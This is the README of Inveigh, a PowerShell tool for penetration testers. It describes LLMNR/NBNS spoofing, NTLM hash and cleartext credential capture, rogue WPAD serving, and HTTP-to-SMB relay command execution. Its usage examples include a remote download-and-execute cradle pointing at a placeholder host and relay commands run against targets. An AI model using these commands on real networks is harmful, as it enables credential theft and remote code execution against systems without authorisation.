# Inveigh
Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. 

## Functions
### Invoke-Inveigh
* The main Inveigh LLMNR/NBNS spoofer function.

##### Privilege Requirements:
* Elevated Administrator or SYSTEM

##### Features:
* IPv4 LLMNR/NBNS spoofer with granular control     
* NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB  
* Basic auth cleartext credential capture over HTTP/HTTPS  
* WPAD server capable of hosting a basic or custom wpad.dat file  
* HTTP/HTTPS server capable of hosting limited content  
* Granular control of console and file output  
* Run time control  

##### Notes:
* LLMNR/NBNS spoofing is performed by packet sniffing and responding through raw sockets.  
* SMB challenge/response captures are performed by sniffing over the host system's SMB service.  

##### Parameters:
* __IP__ - Specify a specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the 'SpooferIP' parameter is not set.  
* __SpooferIP__ - Specify an IP address for LLMNR/NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh host.    
* __SpooferHostsReply__ - Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR and NBNS.  
* __SpooferHostsIgnore__ - Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR and NBNS.  
* __SpooferIPsReply__ - Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR and NBNS.  
* __SpooferIPsIgnore__ - Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR and NBNS.  
* __SpooferRepeat__ - Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured.  
* __LLMNR__ - Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing.  
* __LLMNRTTL__ - Default = 30 Seconds: Specify a custom LLMNR TTL in seconds for the response packet.  
* __NBNS__ - Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.  
* __NBNSTTL__ - Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.  
* __NBNSTypes__ - Default = 00,20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name  
* __HTTP__ - Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.  
* __HTTPS__ - Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443. If the function does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.  
* __HTTPAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type. This setting does not apply to wpad.dat requests.  
* __HTTPBasicRealm__ - Specify a realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth.  
* __HTTPDir__ - Specify a full directory path to enable hosting of basic content through the HTTP/HTTPS listener.     
* __HTTPDefaultFile__ - Specify a filename within the HTTPDir to serve as the default HTTP/HTTPS response file. This file will not be used for wpad.dat requests.  
* __HTTPDefaultEXE__ - Specify an EXE filename within the HTTPDir to serve as the default HTTP/HTTPS response for EXE requests.  
* __HTTPResponse__ - Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests. This parameter will not be used if HTTPDir is set. Use PowerShell character escapes where necessary.  
* __HTTPSCertAppID__ - Specify a valid application GUID for use with the ceriticate.  
* __HTTPSCertThumbprint__ - Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current working directory and named Inveigh.pfx.   
* __WPADAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.  
* __WPADEmptyFile__ - Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests. Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when using WPADIP, WPADPort, or WPADResponse.  
* __WPADIP__ - Specify a proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort.  
* __WPADPort__ - Specify a proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP.  
* __WPADDirectHosts__ - Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy.  
* __WPADResponse__ - Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort are set. Use PowerShell character escapes where necessary.   
* __SMB__ - Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to prevent login requests from being processed by the Inveigh host.  
* __Challenge__ - Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request. This will only be used for non-relay captures.  
* __MachineAccounts__ - Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.  
* __SMBRelay__ - Default = Disabled: (Y/N) Enable/Disable SMB relay. Note that Inveigh-Relay.ps1 must be loaded into memory.  
* __SMBRelayTarget__ - IP address of system to target for SMB relay.  
* __SMBRelayCommand__ - Command to execute on SMB relay target. Use PowerShell character escapes where necessary.  
* __SMBRelayUsernames__ - Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.  
* __SMBRelayAutoDisable__ - Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.  
* __SMBRelayNetworkTimeout__ - Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.  
* __ConsoleOutput__ - Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.
* __ConsoleStatus__ - Default = Disabled: (Integer) Set interval in minutes for displaying all unique captured hashes and credentials. This is useful for displaying full capture lists when running through a shell that does not have access to the support functions.  
* __ConsoleUnique__ - Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time console output is enabled.    
* __FileOutput__ - Default = Disabled: (Y/N) Enable/Disable real time file output.  
* __FileUnique__ - Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time file output is enabled.   
* __StatusOutput__ - Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.  
* __OutputStreamOnly__ - Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams. Note that you will not see the various yellow warning messages if enabled.  
* __OutputDir__ - Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must also be enabled.  
* __ShowHelp__ - Default = Enabled: (Y/N) Enable/Disable the help messages at startup.  
* __RunTime__ - Default = Unlimited: (Integer) Set the run time duration in minutes.  
* __Inspect__ - (Switch) Disable LLMNR, NBNS, HTTP, HTTPS, and SMB in order to only inspect LLMNR/NBNS traffic.  
* __Tool__ - Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire 
  
### Invoke-InveighBruteForce
* The remote (Hot Potato method)/unprivileged NBNS brute force spoofer function. This function can be used to perform NBNS spoofing across subnets and/or perform NBNS spoofing without an elevated administrator or SYSTEM shell.

##### Privilege Requirements:
* Regular User
  
##### Features: 
* Targeted IPv4 NBNS brute force spoofer with granular control  
* NTLMv1/NTLMv2 challenge/response capture over HTTP  
* Granular control of console and file output  
* Run time control  

##### Notes:
* Microsoft released patches in June 2016 that will likely prevent some of this function's features from working.  

##### Parameters:
* __SpooferIP__ - Specify an IP address for NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh Brute Force host.   
* __SpooferTarget__ - Specify an IP address to target for brute force NBNS spoofing.   
* __Hostname__ - Default = WPAD: Specify a hostname for NBNS spoofing.  
* __NBNS__ - Default = Disabled: (Y/N) Enable/Disable NBNS spoofing.  
* __NBNSPause__ Default = Disabled: (Integer) Specify the number of seconds the NBNS brute force spoofer will stop spoofing after an incoming HTTP request is received.  
* __NBNSTTL__ - Default = 165 Seconds: Specify a custom NBNS TTL in seconds for the response packet.  
* __HTTP__ - Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.  
* __HTTPIP__ - Default = Any: Specify a TCP IP address for the HTTP listener.  
* __HTTPPort__ - Default = 80: Specify a TCP port for the HTTP listener.  
* __HTTPAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type. This setting does not apply to wpad.dat requests.  
* __HTTPBasicRealm__ - Specify a realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth. Use PowerShell character escapes where necessary.  
* __HTTPResponse__ - Specify a string or HTML to serve as the default HTTP/HTTPS response. This response will not be used for wpad.dat requests.  
* __WPADAuth__ - Default = NTLM: (Anonymous,Basic,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.  
* __WPADIP__ - Specify a proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort.  
* __WPADPort__ - Specify a proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP.  
* __WPADDirectHosts__ - Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy.   
* __WPADResponse__ - Specify wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort are set. Use PowerShell character escapes where necessary.   
* __Challenge__ - Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request. This will only be used for non-relay captures.  
* __MachineAccounts__ - Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.  
* __ConsoleOutput__ - Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.  
* __FileOutput__ - Default = Disabled: (Y/N) Enable/Disable real time file output.  
* __StatusOutput__ - Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.  
* __OutputStreamOnly__ - Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh Brute Force through a shell that does not return other output streams. Note that you will not see the various yellow warning messages if enabled.  
* __OutputDir__ - Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must also be enabled.  
* __ShowHelp__ - Default = Enabled: (Y/N) Enable/Disable the help messages at startup. 
* __RunCount__ - Default = Unlimited: (Integer) Set the number of captures to perform before auto-exiting.  
* __RunTime__ - Default = Unlimited: (Integer) Set the run time duration in minutes.  
* __Tool__ - Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire
  
### Invoke-InveighRelay
* The NTLMv2 HTTP/HTTPS to SMB relay command execution function. This function can be used with or without Invoke-Inveigh.

##### Privilege Requirements:
* Elevated Administrator or SYSTEM

##### Features:
* HTTP/HTTPS to SMB NTLMv2 relay with granular control    
* NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS 
* Granular control of console and file output  
* Can be executed as either a standalone function or through Invoke-Inveigh  

##### Parameters:
* __HTTP__ - Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.  
* __HTTPS__ - Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443. If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.  
* __HTTPSCertAppID__ - Specify a valid application GUID for use with the ceriticate.  
* __HTTPSCertThumbprint__ - Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be located in the current working directory and named Inveigh.pfx.    
* __Challenge__ - Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be pulled from the SMB relay target.  
* __MachineAccounts__ - Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.  
* __WPADAuth__ - Default = NTLM: (Anonymous,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.  
* __SMBRelayTarget__ - IP address of system to target for SMB relay.  
* __SMBRelayCommand__ - Command to execute on SMB relay target. Use PowerShell character escapes where necessary.  
* __SMBRelayUsernames__ - Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.  
* __SMBRelayAutoDisable__ - Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.  
* __SMBRelayNetworkTimeout__ - Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.  
* __ConsoleOutput__ - Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.  
* __FileOutput__ - Default = Disabled: (Y/N) Enable/Disable real time file output.  
* __StatusOutput__ - Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.  
* __OutputStreamOnly__ - Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the various yellow warning messages if enabled.  
* __OutputDir__ - Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must also be enabled.  
* __ShowHelp__ - Default = Enabled: (Y/N) Enable/Disable the help messages at startup.  
* __RunTime__ - Default = Unlimited: (Integer) Set the run time duration in minutes.  
* __Tool__ - Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire   

### Support Functions
* __Get-Inveigh__ - Get queued console output  
* __Get-InveighCleartext__ - Get all captured cleartext credentials  
* __Get-InveighLog__ - Get log entries    
* __Get-InveighNTLMv1__ - Get all or unique (-unique) captured NTLMv1 challenge/response hashes  
* __Get-InveighNTLMv2__ - Get all or unique (-unique) captured NTLMv2 challenge/response hashes  
* __Watch-Inveigh__ - Enable real time console output  
* __Clear-Inveigh__ - Clear Inveigh data from memory  
* __Stop-Inveigh__ - Stop all running Inveigh functions  

## Miscellaneous Notes
* The local LLMNR/NBNS services do not need to be disabled on the host system.   
* LLMNR/NBNS spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind.  
* Kerberos should downgrade for SMB authentication due to spoofed hostnames not being valid in DNS.  
* Ensure that any needed LMMNR,NBNS,SMB,HTTP,HTTPS ports are open within any local firewall on the host system.  
* If you copy/paste challenge/response captures from the console window for password cracking, ensure that there are no extra carriage returns.

## System Requirements
* Tested minimums are PowerShell 2.0 and .NET 3.5

## Usage  
* To import with Import-Module:   
	Import-Module ./Inveigh.psd1  

* To import using dot source method:  
	. ./Inveigh.ps1  
	. ./Inveigh-BruteForce.ps1  
	. ./Inveigh-Relay.ps1  

* To load into memory using Invoke-Expression:  
	IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh.ps1")  
	IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh-Relay.ps1")  

## Examples
* To execute with default settings:  
	Invoke-Inveigh

* To load and execute with one line:    
	Import-Module ./Inveigh.ps1;Invoke-Inveigh

* To execute with parameters (Use 'Get-Help -parameter * Invoke-Inveigh' for a full list of parameters):   
	Invoke-Inveigh -IP 'local IP' -SpooferIP 'local or remote IP' -LLMNR Y/N -NBNS Y/N -NBNSTypes 00,03,20,1B -HTTP Y/N -HTTPS Y/N -SMB Y/N -Repeat Y/N -ConsoleOutput Y/N -FileOutput Y/N -OutputDir 'valid folder path'
	
* To execute with SMB relay enabled through Invoke-Inveigh:   
	Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 'valid SMB target IP' -SMBRelayCommand "valid command to run on target"

* To execute SMB relay with only Invoke-InveighRelay:  
	Invoke-InveighRelay -SMBRelayTarget 'valid SMB target IP' -SMBRelayCommand "valid command to run on target"  
	
* To execute Inveigh-BruteForce against a target:  
	Invoke-InveighRelay -SpooferTarget 'remote or local target IP'  

## Included In
* PowerShell Empire - https://github.com/PowerShellEmpire/Empire  
* PS>Attack - https://github.com/jaredhaight/psattack  
* p0wnedShell - https://github.com/Cn33liz/p0wnedShell   

## Special Thanks  
* Anyone that posted .NET packet sniffing examples.  
* Responder - https://github.com/SpiderLabs/Responder  
* Impacket - https://github.com/CoreSecurity/impacket  

## Screenshots
Invoke-Inveigh execution with real time console and file output enabled
![inveighv1](https://cloud.githubusercontent.com/assets/5897462/12239354/4bb8a01a-b856-11e5-8a1e-5c0ebbb1ff35.PNG)

Retrieval of captured NTLM2 challenge/response hashes with Get-InveighNTLMv2
![inveigh2](https://cloud.githubusercontent.com/assets/5897462/10326313/abde41d8-6c67-11e5-91b8-0c55271ba326.png)

HTTP to SMB Relay
![inveigh3](https://cloud.githubusercontent.com/assets/5897462/10326314/b2de540a-6c67-11e5-8627-fe5d27018dc3.png)

Module import and execution through one of Ben Turner and Dave Hardy's Metasploit Interactive PowerShell Session payloads
![inveigh5](https://cloud.githubusercontent.com/assets/5897462/10354363/53e73784-6d2d-11e5-8509-9bb7f3feab88.png)
